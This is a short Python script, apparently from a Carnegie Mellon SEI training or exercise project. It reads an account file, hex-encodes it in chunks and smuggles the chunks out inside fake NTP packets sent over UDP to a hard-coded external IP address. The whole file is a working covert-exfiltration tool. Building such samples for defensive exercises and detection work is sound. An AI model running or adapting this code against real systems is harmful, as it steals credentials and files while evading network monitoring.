
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import socket
import time

def chunk_file(file_path, chunk_size):
    with open(file_path, 'r') as f:
        data = f.read()
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        return chunks

def send_ntp_packet(data):
    NTP_SERVER = '45.79.150.152'
    NTP_PORT = 123

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(1)

    for chunk in data:
        packet = bytearray([0x1b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        packet += chunk.encode('utf-8').hex().encode('utf-8')

        client.sendto(packet, (NTP_SERVER, NTP_PORT))
        time.sleep(0.5)

    client.close()

if __name__ == '__main__':
    file_path = '/home/user/Downloads/account.txt'
    chunk_size = 32

    chunks = chunk_file(file_path, chunk_size)
    send_ntp_packet(chunks)

